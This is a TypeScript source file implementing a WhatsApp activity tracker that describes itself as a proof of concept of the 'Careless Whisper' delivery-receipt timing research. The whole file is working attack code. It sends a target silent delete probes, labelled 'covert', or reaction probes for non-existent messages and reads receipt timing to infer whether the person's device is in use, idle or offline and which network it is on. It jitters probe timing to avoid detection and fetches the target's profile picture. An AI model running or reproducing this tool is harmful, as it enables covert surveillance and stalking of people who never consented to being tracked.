import '@whiskeysockets/baileys';
import { WASocket, proto } from '@whiskeysockets/baileys';
import { config } from './config.js';
import { RttAnalyzer, StateAnalysisResult, ActivityState, NetworkType, ConfidenceLevel } from './services/rttAnalyzer.js';
import { pino } from 'pino';

// Suppress Baileys debug output (Closing session spam)
const logger = pino({
    level: process.argv.includes('--debug') ? 'debug' : 'silent'
});

/**
 * Probe method types
 * - 'delete': Silent delete probe (sends delete request for non-existent message) - DEFAULT
 * - 'reaction': Reaction probe (sends reaction to non-existent message)
 */
export type ProbeMethod = 'delete' | 'reaction';

/**
 * Logger utility for debug and normal mode
 */
class TrackerLogger {
    private isDebugMode: boolean;

    constructor(debugMode: boolean = false) {
        this.isDebugMode = debugMode;
    }

    setDebugMode(enabled: boolean) {
        this.isDebugMode = enabled;
    }

    debug(...args: unknown[]) {
        if (this.isDebugMode) {
            console.log(...args);
        }
    }

    info(...args: unknown[]) {
        console.log(...args);
    }

    error(...args: unknown[]) {
        console.error(...args);
    }

    formatDeviceState(
        jid: string, 
        rtt: number, 
        analysis: StateAnalysisResult
    ) {
        const stateColor = analysis.activityState === 'Online' ? '🟢' : 
                          analysis.activityState === 'Standby' ? '🟡' : 
                          analysis.activityState === 'Offline' ? '🔴' : '⚪';
        const networkIcon = analysis.networkType === 'Wi-Fi' ? '📶' : 
                           analysis.networkType === 'LTE' ? '📱' : '❓';
        const confidenceIcon = analysis.confidenceLevel === 'High' ? '✓' : 
                               analysis.confidenceLevel === 'Medium' ? '~' : '?';
        const timestamp = new Date().toLocaleTimeString('en-US');
        const statusText = `${analysis.activityState} / ${analysis.networkType}`;
        const confidenceText = `${analysis.confidenceLevel} (${analysis.observedTransitions} transitions)`;

        console.log(`\n╔════════════════════════════════════════════════════════════════╗`);
        console.log(`║ ${stateColor} ${networkIcon} Device Status Update - ${timestamp}              ║`);
        console.log(`╠════════════════════════════════════════════════════════════════╣`);
        console.log(`║ JID:           ${jid.padEnd(45)} ║`);
        console.log(`║ Status:        ${statusText.padEnd(45)} ║`);
        console.log(`║ Confidence:    ${confidenceIcon} ${confidenceText.padEnd(43)} ║`);
        console.log(`║ RTT:           ${rtt}ms${' '.repeat(45 - (rtt.toString().length + 2))}║`);
        
        // Show pending state changes (decoupled activity and network)
        if (analysis.activityPending || analysis.networkPending) {
            console.log(`╠────────────────────────────────────────────────────────────────╣`);
            if (analysis.activityPending) {
                const activityBar = this.createProgressBar(analysis.activityProgress);
                console.log(`║ ⏳ Activity:   ${analysis.rawActivityState} ${activityBar} ${analysis.activityProgress.toFixed(0)}%${' '.repeat(Math.max(0, 19 - analysis.activityProgress.toFixed(0).length))}║`);
            }
            if (analysis.networkPending) {
                const networkBar = this.createProgressBar(analysis.networkProgress);
                console.log(`║ ⏳ Network:    ${analysis.rawNetworkType} ${networkBar} ${analysis.networkProgress.toFixed(0)}%${' '.repeat(Math.max(0, 21 - analysis.networkProgress.toFixed(0).length))}║`);
            }
        }
        
        console.log(`╠────────────────────────────────────────────────────────────────╣`);
        console.log(`║ Window Median: ${analysis.windowMedian.toFixed(0)}ms${' '.repeat(45 - (analysis.windowMedian.toFixed(0).length + 2))}║`);
        console.log(`║ Window Jitter: ${analysis.windowJitter.toFixed(0)}ms (IQR)${' '.repeat(38 - (analysis.windowJitter.toFixed(0).length + 2))}║`);
        console.log(`╠────────────────────────────────────────────────────────────────╣`);
        const thresholdLabel = analysis.confidenceLevel === 'Low' ? 'Fixed' : `P${config.magnitudePercentile}`;
        console.log(`║ μ Threshold:   ${analysis.magnitudeThreshold.toFixed(0)}ms (${thresholdLabel})${' '.repeat(Math.max(0, 39 - analysis.magnitudeThreshold.toFixed(0).length - thresholdLabel.length))}║`);
        console.log(`║ σ Threshold:   ${analysis.jitterThreshold.toFixed(0)}ms (P${config.jitterPercentile})${' '.repeat(36 - (analysis.jitterThreshold.toFixed(0).length + 2))}║`);
        console.log(`╚════════════════════════════════════════════════════════════════╝\n`);
    }

    /**
     * Create a simple progress bar for state confirmation
     */
    private createProgressBar(progress: number): string {
        const totalWidth = 15;
        const filledWidth = Math.round((progress / 100) * totalWidth);
        const emptyWidth = totalWidth - filledWidth;
        return '[' + '█'.repeat(filledWidth) + '░'.repeat(emptyWidth) + ']';
    }
}

const trackerLogger = new TrackerLogger();

/**
 * Metrics tracked per device for activity monitoring
 */
interface DeviceMetrics {
    rttHistory: number[];        // Historical RTT measurements (up to deviceHistoryLimit)
    activityState: ActivityState; // Current activity state (Online/Standby/Calibrating/Offline)
    networkType: NetworkType;    // Inferred network type (Wi-Fi/LTE/Unknown)
    lastRtt: number;             // Most recent RTT measurement
    lastUpdate: number;          // Timestamp of last update
    consecutiveTimeouts: number; // Track consecutive timeouts for offline detection
    // Last analysis result for display
    lastAnalysis: StateAnalysisResult | null;
}

/**
 * WhatsAppTracker - Monitors messaging app user activity using RTT-based analysis
 *
 * This class implements a privacy research proof-of-concept that demonstrates
 * how messaging apps can leak user activity information through network timing.
 *
 * The tracker sends probe messages and measures Round-Trip Time (RTT) to detect
 * when a user's device is actively in use vs. in standby mode.
 *
 * Works with WhatsApp, Signal, and similar messaging platforms.
 *
 * Based on research: "Careless Whisper: Exploiting Silent Delivery Receipts to Monitor Users"
 * by Gegenhuber et al., University of Vienna & SBA Research
 */
export class WhatsAppTracker {
    private sock: WASocket;
    private targetJid: string;
    private trackedJids: Set<string> = new Set(); // Multi-device support
    private isTracking: boolean = false;
    private deviceMetrics: Map<string, DeviceMetrics> = new Map();
    private rttAnalyzer: RttAnalyzer; // Use centralized RTT analyzer
    private probeStartTimes: Map<string, number> = new Map();
    private probeTimeouts: Map<string, NodeJS.Timeout> = new Map();
    private lastPresence: string | null = null;
    private probeMethod: ProbeMethod = 'delete'; // Default to delete method
    public onUpdate?: (data: unknown) => void;

    // Store event listener references for cleanup
    private messagesUpdateListener: ((updates: { key: proto.IMessageKey, update: Partial<proto.IWebMessageInfo> }[]) => void) | null = null;
    private presenceUpdateListener: ((update: { id: string, presences: { [participant: string]: { lastKnownPresence: string } } }) => void) | null = null;

    constructor(sock: WASocket, targetJid: string, debugMode: boolean = false) {
        this.sock = sock;
        this.targetJid = targetJid;
        this.trackedJids.add(targetJid);
        this.rttAnalyzer = new RttAnalyzer();
        trackerLogger.setDebugMode(debugMode);
    }

    public setProbeMethod(method: ProbeMethod) {
        this.probeMethod = method;
        trackerLogger.info(`\n🔄 Probe method changed to: ${method === 'delete' ? 'Silent Delete' : 'Reaction'}\n`);
    }

    public getProbeMethod(): ProbeMethod {
        return this.probeMethod;
    }

    /**
     * Start tracking the target user's activity
     * Sets up event listeners for message receipts and presence updates
     */
    public async startTracking() {
        if (this.isTracking) return;
        this.isTracking = true;
        trackerLogger.info(`\n✅ Tracking started for ${this.targetJid}`);
        trackerLogger.info(`Probe method: ${this.probeMethod === 'delete' ? 'Silent Delete (covert)' : 'Reaction'}\n`);

        // Create and store event listener references for cleanup
        this.messagesUpdateListener = (updates) => {
            for (const update of updates) {
                // Check if update is from any of the tracked JIDs (multi-device support)
                if (update.key.remoteJid && this.trackedJids.has(update.key.remoteJid) && update.key.fromMe) {
                    this.analyzeUpdate(update);
                }
            }
        };

        // Listen for raw receipts to catch 'inactive' type which are ignored by Baileys
        this.sock.ws.on('CB:receipt', (node: any) => {
            this.handleRawReceipt(node);
        });

        this.presenceUpdateListener = (update) => {
            trackerLogger.debug('[PRESENCE] Raw update received:', JSON.stringify(update, null, 2));

            if (update.presences) {
                for (const [jid, presenceData] of Object.entries(update.presences)) {
                    if (presenceData && presenceData.lastKnownPresence) {
                        // Track multi-device JIDs (including LID)
                        this.trackedJids.add(jid);
                        trackerLogger.debug(`[MULTI-DEVICE] Added JID to tracking: ${jid}`);

                        this.lastPresence = presenceData.lastKnownPresence;
                        trackerLogger.debug(`[PRESENCE] Stored presence from ${jid}: ${this.lastPresence}`);
                        break;
                    }
                }
            }
        };

        // Listen for message updates (receipts)
        this.sock.ev.on('messages.update', this.messagesUpdateListener);

        // Listen for presence updates
        this.sock.ev.on('presence.update', this.presenceUpdateListener);

        // Subscribe to presence updates
        try {
            await this.sock.presenceSubscribe(this.targetJid);
            trackerLogger.debug(`[PRESENCE] Successfully subscribed to presence for ${this.targetJid}`);
            trackerLogger.debug(`[MULTI-DEVICE] Currently tracking JIDs: ${Array.from(this.trackedJids).join(', ')}`);
        } catch (err) {
            trackerLogger.debug('[PRESENCE] Error subscribing to presence:', err);
        }

        // Send initial state update
        if (this.onUpdate) {
            this.onUpdate({
                devices: [],
                deviceCount: this.trackedJids.size,
                presence: this.lastPresence,
                magnitudeThreshold: config.fixedMagnitudeThreshold,
                jitterThreshold: 0,
                windowSize: 0,
                historySize: 0,
                discardedSamples: 0,
                confidenceLevel: 'Low',
                observedTransitions: 0
            });
        }

        // Start the probe loop
        this.probeLoop();
    }

    private async probeLoop() {
        while (this.isTracking) {
            try {
                await this.sendProbe();
            } catch (err) {
                trackerLogger.error('[PROBE ERROR] Error in probe loop:', err);
            }
            // Add jitter to probe interval to avoid detection patterns
            const jitter = Math.floor(Math.random() * 100);
            const delay = config.probeInterval.default + jitter;
            await new Promise(resolve => setTimeout(resolve, delay));
        }
    }

    private async sendProbe() {
        if (this.probeMethod === 'delete') {
            await this.sendDeleteProbe();
        } else {
            await this.sendReactionProbe();
        }
    }

    /**
     * Send a delete probe - completely silent/covert method
     * Sends a "delete" command for a non-existent message
     */
    private async sendDeleteProbe() {
        try {
            // Generate a random message ID that likely doesn't exist
            const prefixes = ['3EB0', 'BAE5', 'F1D2', 'A9C4', '7E8B', 'C3F9', '2D6A'];
            const randomPrefix = prefixes[Math.floor(Math.random() * prefixes.length)];
            const randomSuffix = Math.random().toString(36).substring(2, 10).toUpperCase();
            const randomMsgId = randomPrefix + randomSuffix;
            
            const randomDeleteMessage = {
                delete:{
                    remoteJid: this.targetJid,
                    fromMe: true,
                    id: randomMsgId,
                }
            };

            trackerLogger.debug(
                `[PROBE-DELETE] Sending silent delete probe for fake message ${randomMsgId}`
            );
            const startTime = Date.now();
            
            const result = await this.sock.sendMessage(this.targetJid, randomDeleteMessage);

            if (result?.key?.id) {
                trackerLogger.debug(`[PROBE-DELETE] Delete probe sent successfully, message ID: ${result.key.id}`);
                this.probeStartTimes.set(result.key.id, startTime);

                // Set timeout: if no CLIENT ACK within 10 seconds, mark device as OFFLINE
                const timeoutId = setTimeout(() => {
                    if (this.probeStartTimes.has(result.key.id!)) {
                        const elapsedTime = Date.now() - startTime;
                        trackerLogger.debug(`[PROBE-DELETE TIMEOUT] No CLIENT ACK for ${result.key.id} after ${elapsedTime}ms - Device is OFFLINE`);
                        this.probeStartTimes.delete(result.key.id!);
                        this.probeTimeouts.delete(result.key.id!);

                        // Mark device as OFFLINE due to no response
                        if (result.key.remoteJid) {
                            this.markDeviceOffline(result.key.remoteJid, elapsedTime);
                        }
                    }
                }, 10000); // 10 seconds timeout

                this.probeTimeouts.set(result.key.id, timeoutId);
            } else {
                trackerLogger.debug('[PROBE-DELETE ERROR] Failed to get message ID from send result');
            }
        } catch (err) {
            trackerLogger.error('[PROBE-DELETE ERROR] Failed to send delete probe message:', err);
        }
    }

    /**
     * Send a reaction probe - original method
     * Uses a reaction to a non-existent message to minimize user disruption
     */
    private async sendReactionProbe() {
        try {
            // Generate a random message ID that likely doesn't exist
            const prefixes = ['3EB0', 'BAE5', 'F1D2', 'A9C4', '7E8B', 'C3F9', '2D6A'];
            const randomPrefix = prefixes[Math.floor(Math.random() * prefixes.length)];
            const randomSuffix = Math.random().toString(36).substring(2, 10).toUpperCase();
            const randomMsgId = randomPrefix + randomSuffix;

            // Randomize reaction emoji
            const reactions = ['👍', '❤️', '😂', '😮', '😢', '🙏', '👻', '🔥', '✨', ''];
            const randomReaction = reactions[Math.floor(Math.random() * reactions.length)];

            const reactionMessage = {
                react: {
                    text: randomReaction,
                    key: {
                        remoteJid: this.targetJid,
                        fromMe: false,
                        id: randomMsgId
                    }
                }
            };

            trackerLogger.debug(`[PROBE-REACTION] Sending probe with reaction "${randomReaction}" to non-existent message ${randomMsgId}`);
            const result = await this.sock.sendMessage(this.targetJid, reactionMessage);
            const startTime = Date.now();

            if (result?.key?.id) {
                trackerLogger.debug(`[PROBE-REACTION] Probe sent successfully, message ID: ${result.key.id}`);
                this.probeStartTimes.set(result.key.id, startTime);

                // Set timeout: if no CLIENT ACK within timeout, mark device as OFFLINE
                const timeoutId = setTimeout(() => {
                    if (this.probeStartTimes.has(result.key.id!)) {
                        const elapsedTime = Date.now() - startTime;
                        trackerLogger.debug(`[PROBE-REACTION TIMEOUT] No CLIENT ACK for ${result.key.id} after ${elapsedTime}ms - Device is OFFLINE`);
                        this.probeStartTimes.delete(result.key.id!);
                        this.probeTimeouts.delete(result.key.id!);

                        // Mark device as potentially offline due to no response
                        if (result.key.remoteJid) {
                            this.handleProbeTimeout(result.key.remoteJid, elapsedTime);
                        }
                    }
                }, config.probeTimeout);

                this.probeTimeouts.set(result.key.id, timeoutId);
            } else {
                trackerLogger.debug('[PROBE-REACTION ERROR] Failed to get message ID from send result');
            }
        } catch (err) {
            trackerLogger.error('[PROBE-REACTION ERROR] Failed to send probe message:', err);
        }
    }

    /**
     * Handle raw receipt nodes directly from the websocket
     * This is necessary because Baileys ignores receipts with type="inactive"
     */
    private handleRawReceipt(node: any) {
        try {
            const { attrs } = node;
            // We only care about 'inactive' receipts here
            if (attrs.type === 'inactive') {
                trackerLogger.debug(`[RAW RECEIPT] Received inactive receipt: ${JSON.stringify(attrs)}`);

                const msgId = attrs.id;
                const fromJid = attrs.from;

                // Guard against missing from attribute
                if (!fromJid) {
                    trackerLogger.debug('[RAW RECEIPT] Missing from JID in receipt');
                    return;
                }

                // Extract base number from device JID (e.g., "15109129852:22@s.whatsapp.net" -> "15109129852")
                const baseNumber = fromJid.split('@')[0].split(':')[0];

                // Check if this matches our target (with or without device ID)
                const isTracked = this.trackedJids.has(fromJid) ||
                                  this.trackedJids.has(`${baseNumber}@s.whatsapp.net`);

                if (isTracked) {
                    this.processAck(msgId, fromJid, 'inactive');
                }
            }
        } catch (err) {
            trackerLogger.debug(`[RAW RECEIPT] Error handling receipt: ${err}`);
        }
    }

    /**
     * Process an ACK (receipt) from a device
     */
    private processAck(msgId: string, fromJid: string, type: string) {
        trackerLogger.debug(`[ACK PROCESS] ID: ${msgId}, JID: ${fromJid}, Type: ${type}`);

        if (!msgId || !fromJid) return;

        // Check if this is one of our probes
        const startTime = this.probeStartTimes.get(msgId);

        if (startTime) {
            const rtt = Date.now() - startTime;
            trackerLogger.debug(`[TRACKING] ✅ ${type.toUpperCase()} received for ${msgId} from ${fromJid}, RTT: ${rtt}ms`);

            // Clear timeout
            const timeoutId = this.probeTimeouts.get(msgId);
            if (timeoutId) {
                clearTimeout(timeoutId);
                this.probeTimeouts.delete(msgId);
            }

            this.probeStartTimes.delete(msgId);
            this.addMeasurementForDevice(fromJid, rtt);
        }
    }

    /**
     * Analyze message update and calculate RTT
     * @param update Message update from WhatsApp
     */
    private analyzeUpdate(update: { key: proto.IMessageKey, update: Partial<proto.IWebMessageInfo> }) {
        const status = update.update.status;
        const msgId = update.key.id;
        const fromJid = update.key.remoteJid;

        if (!msgId || !fromJid) return;

        trackerLogger.debug(`[TRACKING] Message Update - ID: ${msgId}, JID: ${fromJid}, Status: ${status} (${this.getStatusName(status)})`);

        // Only CLIENT ACK (3) means device is online and received the message
        // SERVER ACK (2) only means server received it, not the device
        if (status === 3) { // CLIENT ACK
            this.processAck(msgId, fromJid, 'client_ack');
        }
    }

    private getStatusName(status: number | null | undefined): string {
        switch (status) {
            case 0: return 'ERROR';
            case 1: return 'PENDING';
            case 2: return 'SERVER_ACK';
            case 3: return 'DELIVERY_ACK';
            case 4: return 'READ';
            case 5: return 'PLAYED';
            default: return 'UNKNOWN';
        }
    }

    /**
     * Handle probe timeout - improved offline detection
     * Uses consecutive timeout tracking for more reliable offline detection
     * @param jid Device JID
     * @param timeout Time elapsed before timeout
     */
    private handleProbeTimeout(jid: string, timeout: number) {
        // Initialize device metrics if not exists
        if (!this.deviceMetrics.has(jid)) {
            this.deviceMetrics.set(jid, {
                rttHistory: [],
                activityState: 'Calibrating',
                networkType: 'Unknown',
                lastRtt: timeout,
                lastUpdate: Date.now(),
                consecutiveTimeouts: 1,
                lastAnalysis: null
            });
        } else {
            const metrics = this.deviceMetrics.get(jid)!;
            metrics.consecutiveTimeouts++;
            metrics.lastRtt = timeout;
            metrics.lastUpdate = Date.now();

            // Only mark as Offline after multiple consecutive timeouts
            // This prevents false positives from network hiccups
            if (metrics.consecutiveTimeouts >= 3) {
                metrics.activityState = 'Offline';
                metrics.networkType = 'Unknown';
                trackerLogger.info(`\n🔴 Device ${jid} marked as Offline (${metrics.consecutiveTimeouts} consecutive timeouts)\n`);
            } else {
                trackerLogger.debug(`[DEVICE ${jid}] Timeout ${metrics.consecutiveTimeouts}/3 - not marking offline yet`);
            }
        }

        this.sendUpdate();
    }

    /**
     * Add RTT measurement for a specific device and update its state
     * @param jid Device JID
     * @param rtt Round-trip time in milliseconds
     */
    private addMeasurementForDevice(jid: string, rtt: number) {
        // Initialize device metrics if not exists
        if (!this.deviceMetrics.has(jid)) {
            this.deviceMetrics.set(jid, {
                rttHistory: [],
                activityState: 'Calibrating',
                networkType: 'Unknown',
                lastRtt: rtt,
                lastUpdate: Date.now(),
                consecutiveTimeouts: 0,
                lastAnalysis: null
            });
        }

        const metrics = this.deviceMetrics.get(jid)!;

        // Reset consecutive timeouts since we got a response
        metrics.consecutiveTimeouts = 0;

        // Only process measurements within reasonable range
        if (rtt <= config.offlineThreshold) {
            // 1. Add to device's history for calibration
            metrics.rttHistory.push(rtt);
            if (metrics.rttHistory.length > config.deviceHistoryLimit) {
                metrics.rttHistory.shift();
            }

            // 2. Add to global RTT analyzer (builds sliding window)
            this.rttAnalyzer.addMeasurement(rtt);

            metrics.lastRtt = rtt;
            metrics.lastUpdate = Date.now();

            // Determine new state based on RTT using the analyzer
            this.determineDeviceState(jid);
        } else {
            // High RTT but got a response - device is slow but not offline
            trackerLogger.debug(`[DEVICE ${jid}] High RTT (${rtt}ms) but device responded - marking as Standby`);
            metrics.activityState = 'Standby';
            metrics.networkType = 'Unknown'; // Can't determine network type without proper analysis
            metrics.lastRtt = rtt;
            metrics.lastUpdate = Date.now();
        }

        this.sendUpdate();
    }

    /**
     * Determine device state using two-dimensional statistical analysis
     * - Activity state (Online/Standby) based on RTT magnitude (μ)
     * - Network type (Wi-Fi/LTE) based on RTT jitter (σ)
     * @param jid Device JID
     */
    private determineDeviceState(jid: string) {
        const metrics = this.deviceMetrics.get(jid);
        if (!metrics) return;

        // Use the RTT analyzer to determine state with two-dimensional model
        const analysis: StateAnalysisResult = this.rttAnalyzer.determineState(
            metrics.activityState,
            false // Not a timeout
        );

        // Update device metrics with analysis results
        metrics.activityState = analysis.activityState;
        metrics.networkType = analysis.networkType;
        metrics.lastAnalysis = analysis;

        // Normal mode: Formatted output
        trackerLogger.formatDeviceState(jid, metrics.lastRtt, analysis);

        // Debug mode: Additional debug information
        trackerLogger.debug(`[DEBUG] Window size: ${this.rttAnalyzer.getWindowSize()}, History size: ${this.rttAnalyzer.getHistorySize()}`);
    }

    /**
     * Send update to client with current tracking data
     */
    private sendUpdate() {
        // Build devices array with new state model (decoupled confirmation)
        const devices = Array.from(this.deviceMetrics.entries()).map(([jid, metrics]) => ({
            jid,
            activityState: metrics.activityState,
            networkType: metrics.networkType,
            rtt: metrics.lastRtt,
            // Include analysis metrics if available
            windowMedian: metrics.lastAnalysis?.windowMedian ?? 0,
            windowJitter: metrics.lastAnalysis?.windowJitter ?? 0,
            // Include raw states
            rawActivityState: metrics.lastAnalysis?.rawActivityState ?? metrics.activityState,
            rawNetworkType: metrics.lastAnalysis?.rawNetworkType ?? metrics.networkType,
            // Decoupled pending state info
            activityPending: metrics.lastAnalysis?.activityPending ?? false,
            activityProgress: metrics.lastAnalysis?.activityProgress ?? 0,
            networkPending: metrics.lastAnalysis?.networkPending ?? false,
            networkProgress: metrics.lastAnalysis?.networkProgress ?? 0,
            // Include confidence info
            confidenceLevel: metrics.lastAnalysis?.confidenceLevel ?? 'Low',
            observedTransitions: metrics.lastAnalysis?.observedTransitions ?? 0
        }));

        // Get global thresholds from analyzer
        const magnitudeThreshold = this.rttAnalyzer.getEffectiveThreshold();
        const jitterThreshold = this.rttAnalyzer.getJitterThreshold();

        const data = {
            devices,
            deviceCount: this.trackedJids.size,
            presence: this.lastPresence,
            // Global stats for charts (new model)
            magnitudeThreshold,
            jitterThreshold,
            windowSize: this.rttAnalyzer.getWindowSize(),
            historySize: this.rttAnalyzer.getHistorySize(),
            discardedSamples: this.rttAnalyzer.getDiscardedCount(),
            // Confidence info
            confidenceLevel: this.rttAnalyzer.getConfidenceLevel(),
            observedTransitions: this.rttAnalyzer.getObservedTransitions()
        };

        if (this.onUpdate) {
            this.onUpdate(data);
        }
    }

    /**
     * Get profile picture URL for the target user
     * @returns Profile picture URL or null if not available
     */
    public async getProfilePicture() {
        try {
            return await this.sock.profilePictureUrl(this.targetJid, 'image');
        } catch {
            return null;
        }
    }

    /**
     * Stop tracking and clean up resources
     * Properly removes event listeners to prevent memory leaks
     */
    public stopTracking() {
        this.isTracking = false;

        // Remove event listeners to prevent memory leaks
        if (this.messagesUpdateListener) {
            this.sock.ev.off('messages.update', this.messagesUpdateListener);
            this.messagesUpdateListener = null;
        }

        if (this.presenceUpdateListener) {
            this.sock.ev.off('presence.update', this.presenceUpdateListener);
            this.presenceUpdateListener = null;
        }

        // Clear all pending timeouts
        for (const timeoutId of this.probeTimeouts.values()) {
            clearTimeout(timeoutId);
        }
        this.probeTimeouts.clear();
        this.probeStartTimes.clear();

        // Reset the RTT analyzer
        this.rttAnalyzer.reset();

        trackerLogger.info(`\n⏹️ Tracking stopped for ${this.targetJid}\n`);
    }
}
